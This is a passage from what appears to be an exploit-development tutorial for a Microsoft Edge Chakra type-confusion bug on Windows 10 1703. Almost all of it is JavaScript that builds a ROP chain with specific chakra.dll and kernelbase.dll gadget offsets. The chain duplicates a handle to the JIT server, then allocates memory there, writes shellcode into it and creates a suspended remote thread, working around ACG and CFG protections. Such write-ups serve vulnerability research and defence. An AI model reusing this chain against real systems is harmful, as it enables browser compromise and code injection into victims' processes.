On the current version of Windows used to develop this exploit, Windows 10 1703, a `CONTEXT` structure is `0x4d0` bytes in size. So, we will be setting up a call to `VirtualAlloc` to allocate `0x4d0` bytes of memory to store this structure for later usage.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion148.png" alt="">

Here is how our call will be setup:

```c
VirtualAlloc(
	NULL,				// Let the system decide where to allocate the memory
	sizeof(CONTEXT),		// The size we want to allocate (size of a CONTEXT structure)
	MEM_COMMIT | MEM_RESERVE,	// Make sure this memory is committed and reserved
	PAGE_READWRITE			// Make sure the page is writable so GetThreadContext can write to it
);
```

Here is how this looks with ROP (with all previous ROP chains for context):

```javascript
// alert() for debugging
alert("DEBUG");

// Store the value of the handle to the JIT server by way of chakra!ScriptEngine::SetJITConnectionInfo (chakra!JITManager+s_jitManager+0x8)
jitHandle = read64(chakraLo+0x74d838, chakraHigh);

// Helper function to be called after each stack write to increment offset to be written to
function next()
{
    counter+=0x8;
}

// Begin ROP chain
// Since __fastcall requires parameters 5 and so on to be at RSP+0x20, we actually have to put them at RSP+0x28
// This is because we don't push a return address on the stack, as we don't "call" our APIs, we jump into them
// Because of this we have to compensate by starting them at RSP+0x28 since we can't count on a return address to push them there for us

// DuplicateHandle() ROP chain
// Stage 1 -> Abuse PROCESS_DUP_HANDLE handle to JIT server by performing DuplicateHandle() to get a handle to the JIT server with full permissions
// ACG is disabled in the JIT process
// https://bugs.chromium.org/p/project-zero/issues/detail?id=1299

// Writing our ROP chain to the stack, stack+0x8, stack+0x10, etc. after return address overwrite to hijack control-flow transfer

// HANDLE hSourceProcessHandle (RCX) _should_ come first. However, we are configuring this parameter towards the end, as we need RCX for the lpTargetHandle parameter

// HANDLE hSourceHandle (RDX)
// (HANDLE)-1 value of current process
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Pseudo-handle to current process
next();

// HANDLE hTargetProcessHandle (R8)
// (HANDLE)-1 value of current process
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x24628b, chakraHigh);      // 0x18024628b: mov r8, rdx ; add rsp, 0x48 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();

// LPHANDLE lpTargetHandle (R9)
// This needs to be a writable address where the full JIT handle will be stored
// Using .data section of chakra.dll in a part where there is no data
/*
0:053> dqs chakra+0x72E000+0x20010
00007ffc`052ae010  00000000`00000000
00007ffc`052ae018  00000000`00000000
*/
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72e128, chakraHigh);      // .data pointer from chakra.dll with a non-zero value to bypass cmp r8d, [rax] future gadget
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which will hold full perms handle to JIT server;
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hSourceProcessHandle (RCX)
// Handle to the JIT process from the content process
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], jitHandle[0], jitHandle[1]);         // PROCESS_DUP_HANDLE HANDLE to JIT server
next();

// Call KERNELBASE!DuplicateHandle
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], duplicateHandle[0], duplicateHandle[1]); // KERNELBASE!DuplicateHandle (Recall this was our original leaked pointer var for kernelbase.dll)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!DuplicateHandle)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!DuplicateHandle - 0x180243949: add rsp, 0x38 ; ret
next(); 
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // DWORD dwDesiredAccess (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // BOOL bInheritHandle (RSP+0x30)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000002, 0x00000000);             // DWORD dwOptions (RSP+0x38)
next();

// VirtuaAllocEx() ROP chain
// Stage 2 -> Allocate memory in the Edge JIT process (we have a full handle there now)

// DWORD flAllocationType (R9)
// MEM_RESERVE (0x00002000) | MEM_COMMIT (0x00001000)
/*
0:031> ? 0x00002000 | 0x00001000 
Evaluate expression: 12288 = 00000000`00003000
*/
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00003000, 0x00000000);             // MEM_RESERVE | MEM_COMMIT
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// SIZE_T dwSize (R8)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00001000, 0x00000000);             // 0x1000 (shellcode size)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x24628b, chakraHigh);      // 0x18024628b: mov r8, rdx ; add rsp, 0x48 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();

// LPVOID lpAddress (RDX)
// Let VirtualAllocEx decide where the memory will be located
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // NULL address (let VirtualAllocEx deside where we allocate memory in the JIT process)
next();

// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which will hold full perms handle to JIT server
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
next();                                                                     				   // Recall RAX already has a writable pointer in it

// Call KERNELBASE!VirtualAllocEx
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0xff00, kernelbaseHigh); // KERNELBASE!VirtualAllocEx address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!VirtualAllocEx)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!VirtualAllocEx - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)         
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000004, 0x00000000);             // DWORD flProtect (RSP+0x28) (PAGE_READWRITE)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();

// WriteProcessMemory() ROP chain
// Stage 3 -> Write our shellcode into the JIT process

// Store the VirtualAllocEx return address in the .data section of kernelbase.dll (It is currently in RAX)

/*
0:015> dq kernelbase+0x216000+0x4000 L2
00007fff`58cfa000  00000000`00000000 00000000`00000000
*/
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000, kernelbaseHigh); // .data section of kernelbase.dll where we will store VirtualAllocEx allocation
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
next();

// SIZE_T nSize (R9)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00001000, 0x00000000);             // SIZE_T nSize (0x1000)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which holds our full perms handle to JIT server
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
next();                                                                     // Recall RAX already has a writable pointer in it

// LPVOID lpBaseAddress (RDX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000-0x8, kernelbaseHigh); // .data section of kernelbase.dll where we have our VirtualAllocEx allocation
next();                                                                            // (-0x8 to compensate for below where we have to read from the address at +0x8 offset
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x255fa0, chakraHigh);      // mov rdx, qword [rdx+0x08] ; mov rax, rdx ; ret
next();

// LPCVOID lpBuffer (R8) (shellcode in chakra.dll .data section)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);         // 0x180576231: pop r8 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000, chakraHigh);    	  // .data section of chakra.dll holding our shellcode
next();

// Call KERNELBASE!WriteProcessMemory
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x79a40, kernelbaseHigh); // KERNELBASE!WriteProcessMemory address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!WriteProcessMemory)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!WriteProcessMemory - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)         
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // SIZE_T *lpNumberOfBytesWritten (NULL) (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();

// CreateRemoteThread() ROP chain
// Stage 4 -> Create a thread within the JIT process, but create it suspended
// This will allow the thread to _not_ execute until we are ready
// LPTHREAD_START_ROUTINE can be set to anything, as CFG will check it and we will end up setting RIP directly later
// We will eventually hijack RSP of this thread with a ROP chain, and by setting RIP to a return gadget our thread, when executed, will return into our ROP chain
// We will update the thread later via another ROP chain to call SetThreadContext()

// LPTHREAD_START_ROUTINE lpStartAddress (R9)
// This can be any random data, since it will never be executed
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x28b4fe, chakraHigh);	   // 0x180043c63: Anything we want - this will never get executed
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which holds our full perms handle to JIT server
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
next();

// LPSECURITY_ATTRIBUTES lpThreadAttributes (RDX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // NULL (default security properties)
next();

// SIZE_T dwStackSize (R8)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);      // 0x180576231: pop r8 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // 0 (default stack size)
next();

// Call KERNELBASE!CreateRemoteThread
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0xdcfd0, kernelbaseHigh); // KERNELBASE!CreateRemoteThread
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!CreateRemoteThread)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!CreateRemoteThread - 0x180243949: add rsp, 0x38 ; ret
next(); 
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // LPVOID lpParameter (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000004, 0x00000000);             // DWORD dwCreationFlags (RSP+0x30) (CREATE_SUSPENDED to avoid executing the thread routine)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // LPDWORD lpThreadId (RSP+0x38)
next();

// WriteProcessMemory() ROP chain (Number 2)
// Stage 5 -> Update the final ROP chain, currently in the charka.dll .data section, with the address of our shellcode in the pop rcx gadget for lpAddress

// Before, we need to preserve the thread HANDLE returned by CreateRemoteThread
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a100, kernelbaseHigh); // .data section of kernelbase.dll where we will store the thread HANDLE
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
next();

// SIZE_T nSize (R9)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000008, 0x00000000);             // SIZE_T nSize (0x8)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Current process
next();

// LPVOID lpBaseAddress (RDX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000+ropoffsetOne, chakraHigh); // .data section of chakra.dll where our final ROP chain is
next();                                                                       

// LPCVOID lpBuffer (R8) (Our kernelbase.dll .data section address which points to the value we want to write, the allocation of the VirtualAllocEx allocation)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);         // 0x180576231: pop r8 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000, kernelbaseHigh); // .data section of kernelbase.dll where the VirtualAllocEx allocation is stored
next();

// Call KERNELBASE!WriteProcessMemory
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x79a40, kernelbaseHigh); // KERNELBASE!WriteProcessMemory address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!WriteProcessMemory)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!WriteProcessMemory - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // SIZE_T *lpNumberOfBytesWritten (NULL) (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();

// WriteProcessMemory() ROP chain (Number 3)
// Stage 6 -> Update the final ROP chain, currently in the charka.dll .data section, with the address of our shellcode in the pop rdi gadget for our "fake return address"

// SIZE_T nSize (R9)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000008, 0x00000000);             // SIZE_T nSize (0x8)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Current process
next();

